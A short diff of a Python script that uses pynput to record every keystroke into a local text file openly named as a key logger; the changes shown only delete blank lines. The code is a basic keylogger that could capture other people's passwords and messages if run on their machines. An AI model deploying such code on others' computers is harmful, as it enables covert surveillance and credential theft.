@@ -1,5 +1,4 @@
 from pynput import keyboard 
-
 dictionary = {
     'Key.caps_lock': 'caps lock',
     'Key.shift': 'shift chap',
@@ -60,7 +59,6 @@ def pressed(key):
         file.write(str(key).replace("'", ''))
     file.write('\n')
     file.close() 
-
 f = open('key logger mohammadpmf.txt', 'w')
 f.close()
 with keyboard.Listener(on_press=pressed) as listener:
